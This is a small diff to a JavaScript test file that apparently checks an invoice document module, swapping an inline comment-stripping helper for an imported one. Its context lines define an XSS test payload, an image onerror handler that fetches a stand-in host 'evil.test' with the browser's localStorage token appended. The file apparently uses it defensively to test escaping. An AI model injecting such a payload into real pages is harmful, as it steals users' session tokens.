@@ -21,7 +21,7 @@ const { pathToFileURL } = require('url');
 let pass = 0, fail = 0;
 const check = async (n, fn) => { try { await fn(); console.log('  ✓', n); pass++; } catch (e) { console.log('  ✗', n, '—', e.message || e); fail++; } };
 const read = (f) => fs.readFileSync(path.join(__dirname, f), 'utf8');
-const strip = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
+const { strip } = require('./test-source'); // line comments first — see test-source.js
 
 const DOC_PATH = path.join(__dirname, '..', 'wappflow-web', 'src', 'lib', 'invoiceDoc.js');
 const XSS = '<img src=x onerror="fetch(\'https://evil.test/?t=\'+localStorage.token)">';
